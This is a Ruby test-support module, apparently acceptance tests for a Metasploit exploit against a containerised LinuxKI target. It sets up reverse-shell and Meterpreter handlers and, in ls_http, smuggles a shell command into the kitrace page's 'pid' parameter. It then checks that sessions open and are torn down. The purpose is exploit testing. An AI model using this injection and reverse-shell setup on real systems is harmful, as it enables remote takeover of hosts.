# frozen_string_literal: true

require 'digest'
require_relative '../linuxki/acceptance'

# Stock CLI and genuine-page controls precede real owning session delivery.
module LinuxkiSessions
  include LinuxkiTarget

  FAMILIES = {
    'bash' => { target: 2, payload: 'cmd/unix/reverse_bash', session: 'shell' },
    'php' => { target: 0, payload: 'php/meterpreter/reverse_tcp', session: 'meterpreter' },
    'unix-default' => { target: 2, payload: 'cmd/unix/php/meterpreter/reverse_tcp', session: 'meterpreter' }
  }.freeze

  def ls_family
    self.class.metadata.fetch(:linuxki_payload_family)
  end

  def rc_save
    File.write(File.join(target_runtime.fetch('artifacts'), 'linuxki-sessions.json'), JSON.pretty_generate(@rc)) if @rc
  end

  def ls_php?
    ls_family == 'php'
  end

  def ls_payload
    FAMILIES.fetch(ls_family).fetch(:payload)
  end

  def ls_meterpreter?
    FAMILIES.fetch(ls_family).fetch(:session) == 'meterpreter'
  end

  def ls_state
    output, = rc_command('session-process-state', 'target', 'php', '/opt/module-target-linuxki-process.php', @rc.fetch(:current_port, 4470).to_s)
    JSON.parse(output)
  end

  def ls_idle
    lk_registry
    state = ls_state
    baseline = @rc.fetch(:baseline)
    @rc[:states] << { phase: 'idle', state: state }
    rc_save
    expect(state.fetch('connections')).to eq([])
    # Apache may add a spare prefork worker while a session request is busy.
    # It must remain under the original root Apache parent. Other UID33
    # processes must settle back to the initial non-worker set.
    workers = state.fetch('processes').select { |row| row['uid'] == '33' && row['command'] == baseline.fetch(:apache_command) }
    expect(workers).not_to be_empty
    expect(workers).to all(include('ppid' => baseline.fetch(:apache_parent)))
    others = state.fetch('processes').select { |row| row['uid'] == '33' && row['command'] != baseline.fetch(:apache_command) }
    expect(others.map { |row| row.except('state') }).to eq(baseline.fetch(:non_worker_processes))
    true
  end

  def ls_settled
    wait_for_expect(10, 0.15) { expect(ls_idle).to be(true) }
  end

  def ls_route
    token = 'linuxki-native-callback'
    prepared = rc_json("begin;require 'socket';require 'timeout';server=TCPServer.new('0.0.0.0',0);thread=Thread.new do;begin;peer=Timeout.timeout(10){server.accept};begin;value=Timeout.timeout(5){peer.read(#{token.bytesize})};peer.write('ACK:'+value);value;ensure;peer.close;end;ensure;server.close;end;end;thread.report_on_exception=false;framework.instance_variable_set(:@linuxki_callback,[server,thread]);{port:server.local_address.ip_port};end")
    program = '$socket=stream_socket_client("tcp://".$argv[1].":".$argv[2],$errno,$error,5);if(!$socket){throw new RuntimeException($error);}stream_set_timeout($socket,5);fwrite($socket,$argv[3]);$reply=stream_get_contents($socket);fclose($socket);echo $reply;'
    argv = target_runtime.fetch('compose') + ['exec', '-T', '--user', '33', 'target', 'php', '-r', program, listener_host, prepared.fetch('port').to_s, token]
    output, error, status = Open3.capture3(*argv)
    @rc[:route] = { argv: argv, stdout: output, stderr: error, exit: status.exitstatus }
    expect(status.success?).to be(true), error
    expect(output).to eq('ACK:' + token)
    expect(rc_json('begin;server,thread=framework.instance_variable_get(:@linuxki_callback);raise "Callback thread is live" unless thread.join(5);thread.value;end')).to eq(token)
  ensure
    rc_json('begin;server,thread=framework.instance_variable_get(:@linuxki_callback);server.close unless server.closed?;thread.kill if thread.alive?;thread.join;true;end') if prepared
    rc_save
  end

  def ls_ready
    lk_ready
    @ls_port = 4470
    state = ls_state
    parents = state.fetch('processes').select { |row| row['uid'] == '0' && row['command'].start_with?('apache2 ') }
    expect(parents.length).to eq(1)
    apache_command = parents.first.fetch('command')
    baseline = state.fetch('processes').select { |row| row['uid'] == '33' && row['command'] != apache_command }.map { |row| row.except('state') }
    expect(baseline).to eq([])
    @rc[:baseline] = { apache_parent: parents.first.fetch('pid'), apache_command: apache_command, non_worker_processes: baseline }
    @rc[:session_observer] = rc_json("begin;require 'base64';require 'digest';load 'test/module_targets/laravel/session_control.rb';load 'test/module_targets/druid_sessions/session_control.rb';load 'test/module_targets/rocketmq_sessions/session_control.rb';DruidSessionControl.install(framework);end")
    ls_route
    ls_settled
    @rc[:session_prepared] = true
  ensure
    rc_save
  end

  def ls_handler(port)
    @ls_port = port
    @rc[:current_port] = port
    console_command('back')
    console_command('use exploit/multi/handler')
    { 'PAYLOAD' => ls_payload, 'LHOST' => listener_host, 'LPORT' => port, 'ReverseListenerBindAddress' => '0.0.0.0', 'ExitOnSession' => false }.each do |name, value|
      console_command("set #{name} #{value}")
    end
    if ls_php?
      constraints = rc_json("begin;owner=framework.modules.create(#{LinuxkiTarget::OWNER.inspect});owner.datastore['TARGET']=0;active_module.payload_info['BadChars']=owner.payload_badchars;{badchars:active_module.payload_badchars.bytes};end")
      expect(constraints.fetch('badchars')).to eq([39])
    end
    output = console_command('run -j -z')
    expect(output).not_to match(/Exploit failed|Exploit aborted/)
    wait_for_expect(30, 0.1) do
      console_command('jobs')
      expect(console.all_data).to include("Started reverse TCP handler on 0.0.0.0:#{port}")
    end
    generated = rc_json("begin;job=framework.jobs.values.find{|entry|entry.ctx.first.fullname=='exploit/multi/handler'};raise 'No stock handler' unless job;RocketmqSessionControl.command(job,#{ls_payload.inspect});end")
    @rc[:native_payloads] << generated.merge('port' => port)
    expect(Base64.strict_decode64(generated.fetch('command_base64'))).not_to include("'") if ls_php?
    generated
  end

  def ls_use(owner, label)
    row = { owner: owner, payload: ls_payload, label: label, port: @ls_port }
    @rc[:sessions] << row
    wait_for_expect(100, 0.15) do
      ready = File.readlines(@rc.fetch(:session_observer).fetch('ready_event_path')).map { |line| JSON.parse(line).fetch('id') }
      rows = rc_json('framework.sessions.map{|id,session|{id:id,type:session.type,owner:session.via_exploit,payload:session.via_payload,tunnel:session.tunnel_local}}')
      row[:session] = rows.find { |entry| ready.include?(entry.fetch('id')) && entry.values_at('owner', 'payload') == [owner, 'payload/' + ls_payload] }
      expect(row[:session]).not_to be_nil
    end
    identifier = row.fetch(:session).fetch('id')
    expect(row.fetch(:session).fetch('type')).to eq(FAMILIES.fetch(ls_family).fetch(:session))
    path = "/tmp/module-target-linuxki-session-#{Process.pid}-#{identifier}"
    expect(lk_file(path)).to eq('exists' => false)
    row[:proof] = rc_json("LaravelSessionControl.proof(framework,#{identifier},#{path.inspect},'linuxki-session',false,component:'linuxki')")
    pid = row.fetch(:proof).fetch('pid')
    process = ls_state.fetch('processes').find { |entry| entry.fetch('pid') == pid }
    expect(process).to include('uid' => '33')
    row[:physical_process] = process
    expect(lk_file(path)).to eq('exists' => true, 'uid' => 33, 'base64' => Base64.strict_encode64('linuxki-session'))
    expect(ls_state.fetch('connections')).to include(include('state' => '01'))
    row[:shutdown] = rc_json("LaravelSessionControl.shutdown(framework,#{identifier},component:'linuxki')")
    if ls_meterpreter?
      expect(row.fetch(:shutdown).fetch('fresh_response')).to eq(pid)
    else
      expect(row.fetch(:shutdown).fetch('fresh_response')).to include('linuxki-live')
    end
    wait_for_expect(40, 0.1) do
      expect(ls_state.fetch('processes').select { |entry| entry.values_at('pid', 'birth') == process.values_at('pid', 'birth') }).to eq([])
    end
    rc_json("framework.sessions[#{identifier}]&.kill;true")
    expect(rc_json('framework.sessions.keys')).not_to include(identifier)
    # The remote process must exit before local deregistration. Closing the
    # local endpoint then lets a legitimate FIN_WAIT2 entry reach TIME_WAIT.
    wait_for_expect(40, 0.1) { expect(ls_state.fetch('connections')).to eq([]) }
    row[:used_and_closed] = true
  ensure
    lk_remove(path) if path
    rc_save
  end

  def ls_cleanup
    console_command('sessions -K')
    console_command('jobs -K')
    rc_save
  end

  def ls_recover(primary, log: nil, task: nil, request: nil, resources: false)
    steps = []
    if log
      steps << lambda do
        @rc[:native_output] << { path: log, value: lk_file(log) }
        lk_remove(log)
      end
    end
    steps << -> { ls_cleanup }
    if task
      steps << lambda do
        task.join(5)
        if task.alive?
          task.kill
          task.join
          request[:interrupted_after_cleanup] = true
        end
      end
    end
    steps << -> { ls_settled if @rc[:session_prepared] }
    steps << -> { rc_resources('after') } if resources
    errors = []
    steps.each do |step|
      step.call
    rescue StandardError, RSpec::Expectations::ExpectationNotMetError => e
      errors << e
      (@rc[:cleanup_errors] ||= []) << { type: e.class.name, message: e.message }
    end
    (@rc[:primary_errors] ||= []) << { type: primary.class.name, message: primary.message } if primary
    rc_save
    raise errors.first if !primary && !errors.empty?
  end

  def ls_cli(port)
    generated = ls_handler(port)
    program = Base64.strict_decode64(generated.fetch('command_base64'))
    log = "/tmp/module-target-linuxki-native-output-#{Process.pid}-#{port}"
    expect(lk_file(log)).to eq('exists' => false)
    command = ls_php? ? ['php', '-r', program] : ['/bin/sh', '-c', program]
    argv = target_runtime.fetch('compose') + ['exec', '-T', '-d', '--user', '33', 'target', 'sh', '-c', 'output=$1; shift; exec "$@" >"$output" 2>&1', 'native-launch', log, *command]
    output, error, status = Open3.capture3(*argv)
    @rc[:native_launches] << { kind: 'cli', argv: argv, stdout: output, stderr: error, exit: status.exitstatus }
    expect(status.success?).to be(true), error
    ls_use('exploit/multi/handler', 'native-cli-' + port.to_s)
  ensure
    ls_recover($ERROR_INFO, log: log)
  end

  def ls_http(port)
    generated = ls_handler(port)
    program = Base64.strict_decode64(generated.fetch('command_base64'))
    command = ls_php? ? "php -r '#{program}'" : program
    endpoint = target_endpoint('target')
    uri = URI::HTTP.build(host: endpoint.fetch('host'), port: endpoint.fetch('port'), path: LinuxkiTarget::PAGE, query: URI.encode_www_form('type' => 'kitrace', 'pid' => '1;' + command + ';'))
    request = { kind: 'genuine-page', uri: uri.to_s }
    @rc[:native_launches] << request
    task = Thread.new do
      client = Net::HTTP.new(uri.hostname, uri.port, nil)
      client.open_timeout = 5
      client.read_timeout = 80
      response = client.start { |connection| connection.get(uri.request_uri) }
      { code: response.code.to_i, body_base64: Base64.strict_encode64(response.body.to_s.b) }
    end
    task.report_on_exception = false
    ls_use('exploit/multi/handler', 'native-page-' + port.to_s)
    expect(task.join(10)).not_to be_nil
    request[:response] = task.value
    expect(request.fetch(:response).fetch(:code)).to eq(200)
  ensure
    ls_recover($ERROR_INFO, task: task, request: request)
  end

  def ls_owner
    2.times do |index|
      @ls_port = 4472 + index
      @rc[:current_port] = @ls_port
      if index.zero?
        console_command('back')
        console_command('use ' + LinuxkiTarget::OWNER)
        console_command('set TARGET 2') unless ls_php?
        console_command('set PAYLOAD ' + ls_payload) if ls_family == 'bash'
      end
      selected = rc_json('{object:active_module.object_id,target:active_module.target_index,payload:active_module.datastore["PAYLOAD"],source:active_module.method(:execute_command).source_location}')
      expect(selected.fetch('target')).to eq(FAMILIES.fetch(ls_family).fetch(:target))
      expect(selected.fetch('object')).to eq(@rc.fetch(:selected_owner)) if index.positive?
      @rc[:selected_owner] = selected.fetch('object')
      offset = rc_json('framework.instance_variable_get(:@linuxki_events).length')
      options = { 'LHOST' => listener_host, 'LPORT' => @ls_port, 'ReverseListenerBindAddress' => '0.0.0.0', 'AutoCheck' => index.zero?, 'ForceExploit' => false, 'AllowNoCleanup' => true, 'WfsDelay' => 1, 'HttpClientTimeout' => 45 }
      call = { label: 'owner-' + index.to_s, options: options, selected: selected }
      @rc[:calls] << call
      run_target_module(LinuxkiTarget::OWNER, 'target', options, action: 'run -j -z', reuse_module: true, allow_errors: true) { |output| call[:output] = output }
      ls_use(LinuxkiTarget::OWNER, 'owner-' + index.to_s)
      wait_for_expect(10, 0.15) { expect(rc_json('framework.jobs.keys')).to eq([]) }
      call[:events] = rc_json("framework.instance_variable_get(:@linuxki_events).drop(#{offset})")
      expect(call.fetch(:events).count { |row| row['owner_exploit_body'] }).to eq(1)
      checks = call.fetch(:events).filter_map { |row| row['check'] }
      expect(checks.map { |row| row['code'] }).to eq(index.zero? ? ['vulnerable'] : [])
      expect(call.fetch(:events).filter_map { |row| row['response']&.fetch('code') }).to eq([200] * (index.zero? ? 2 : 1))
      ls_settled
    ensure
      ls_cleanup
      rc_save
    end
  end

  def ls_finish
    ls_recover($ERROR_INFO, resources: true) if @rc[:session_prepared]
  ensure
    rc_save
  end
end
